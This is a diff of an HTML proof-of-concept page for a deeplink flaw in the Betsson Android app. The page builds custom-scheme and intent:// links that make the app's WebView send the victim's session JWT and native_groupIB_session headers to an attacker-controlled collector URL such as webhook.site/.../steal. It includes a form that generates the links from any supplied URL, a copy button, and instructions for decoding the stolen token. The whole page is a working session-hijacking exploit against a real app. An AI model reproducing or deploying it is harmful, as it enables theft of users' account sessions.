@@ -1,30 +1,90 @@
 <!doctype html>
-<html>
-<head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Betsson Deeplink PoC</title></head>
-<body style="font-family:sans-serif;padding:24px;line-height:1.6">
-  <h2>Betsson session-token leak PoC</h2>
-  <p>Replace <code>WEBHOOK_ID</code> below with your webhook.site token, then open this page
-     in the device's Chrome (with Betsson installed + logged in) and tap a button.</p>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Betsson Deeplink PoC</title>
+  <style>
+    body{font-family:system-ui,sans-serif;max-width:680px;margin:0 auto;padding:24px;line-height:1.6;color:#111}
+    h2{margin-bottom:4px}
+    .muted{color:#666;font-size:14px}
+    label{display:block;font-weight:600;margin:18px 0 6px}
+    input{width:100%;padding:12px;font-size:16px;border:1px solid #bbb;border-radius:8px;box-sizing:border-box}
+    .btn{display:block;text-align:center;padding:16px;margin:12px 0;border-radius:10px;text-decoration:none;font-weight:600;color:#fff}
+    .btn.scheme{background:#ff6a00}
+    .btn.intent{background:#333}
+    .btn.disabled{opacity:.45;pointer-events:none}
+    code{background:#f3f3f3;padding:2px 6px;border-radius:4px;word-break:break-all}
+    .out{background:#f7f7f7;border:1px solid #e2e2e2;border-radius:8px;padding:12px;margin-top:10px;font-size:13px;word-break:break-all}
+    .copy{background:#0a7;color:#fff;border:none;padding:10px 14px;border-radius:8px;font-size:14px;cursor:pointer}
+  </style>
+</head>
+<body>
+  <h2>Betsson session-token leak &mdash; PoC</h2>
+  <p class="muted">Paste your collector URL (e.g. a <a href="https://webhook.site" target="_blank" rel="noopener">webhook.site</a> URL).
+     On a device with Betsson installed and logged in, tap a trigger below &mdash; the app's WebView will request
+     your URL with the victim's <code>auth</code> (session JWT) and <code>native_groupIB_session</code> headers attached.</p>
 
-  <!-- 1) Plain custom-scheme link (works on tap in Chrome) -->
-  <p>
-    <a id="scheme" href="betsson-oneapp://promotion/?url=https://webhook.site/WEBHOOK_ID/steal"
-       style="display:inline-block;padding:14px 20px;background:#ff6a00;color:#fff;border-radius:8px;text-decoration:none">
-       Trigger via custom scheme
-    </a>
-  </p>
+  <label for="wh">Your collector URL (https only)</label>
+  <input id="wh" type="url" inputmode="url" autocomplete="off"
+         placeholder="https://webhook.site/your-unique-id" />
+  <p class="muted">A path like <code>/steal</code> is appended automatically so it's easy to spot in your logs.</p>
 
-  <!-- 2) intent:// form (more reliable across Chrome versions) -->
-  <p>
-    <a id="intent"
-       href="intent://promotion/?url=https://webhook.site/WEBHOOK_ID/steal#Intent;scheme=betsson-oneapp;package=com.betsson.android;end"
-       style="display:inline-block;padding:14px 20px;background:#333;color:#fff;border-radius:8px;text-decoration:none">
-       Trigger via intent:// (fallback)
-    </a>
-  </p>
+  <a id="scheme" class="btn scheme disabled" href="#">1) Trigger via custom scheme</a>
+  <a id="intent" class="btn intent disabled" href="#">2) Trigger via intent:// (fallback)</a>
 
-  <hr>
-  <p>After tapping, check your webhook.site page — the incoming request to <code>/steal</code>
-     carries the victim's <code>auth</code> (session JWT) and <code>native_groupIB_session</code> headers.</p>
+  <div>
+    <button class="copy" id="copyBtn" disabled>Copy custom-scheme deeplink</button>
+  </div>
+  <div class="out" id="preview">Enter a URL above to build the deeplink&hellip;</div>
+
+  <p class="muted" style="margin-top:24px">After triggering, open your webhook.site page &mdash; the inbound request to
+     <code>/steal</code> carries the leaked headers. Decode the <code>auth</code> JWT to see
+     <code>userId</code> / <code>loginSessionId</code>.</p>
+
+  <script>
+    var wh = document.getElementById('wh');
+    var scheme = document.getElementById('scheme');
+    var intent = document.getElementById('intent');
+    var copyBtn = document.getElementById('copyBtn');
+    var preview = document.getElementById('preview');
+
+    function build() {
+      var base = wh.value.trim();
+      var ok = /^https:\/\/.+/i.test(base);
+      if (!ok) {
+        scheme.classList.add('disabled'); intent.classList.add('disabled');
+        copyBtn.disabled = true;
+        preview.textContent = base ? 'Collector URL must start with https:// (the app blocks cleartext http).'
+                                   : 'Enter a URL above to build the deeplink...';
+        return;
+      }
+      var collector = base.replace(/\/+$/, '') + '/steal';
+      // the app reads getQueryParameter("url"); encode so query/special chars survive
+      var enc = encodeURIComponent(collector);
+      var schemeUrl = 'betsson-oneapp://promotion/?url=' + enc;
+      var intentUrl = 'intent://promotion/?url=' + enc +
+                      '#Intent;scheme=betsson-oneapp;package=com.betsson.android;end';
+      scheme.href = schemeUrl; intent.href = intentUrl;
+      scheme.classList.remove('disabled'); intent.classList.remove('disabled');
+      copyBtn.disabled = false;
+      copyBtn.dataset.link = schemeUrl;
+      preview.innerHTML = '<b>Custom scheme:</b><br>' + schemeUrl +
+                          '<br><br><b>intent://</b><br>' + intentUrl;
+    }
+
+    copyBtn.addEventListener('click', function () {
+      navigator.clipboard.writeText(copyBtn.dataset.link || '').then(function () {
+        var t = copyBtn.textContent; copyBtn.textContent = 'Copied!';
+        setTimeout(function () { copyBtn.textContent = t; }, 1200);
+      });
+    });
+
+    wh.addEventListener('input', build);
+    // allow prefill via ?collector= on this page's own URL
+    var pre = new URLSearchParams(location.search).get('collector');
+    if (pre) { wh.value = pre; }
+    build();
+  </script>
 </body>
 </html>
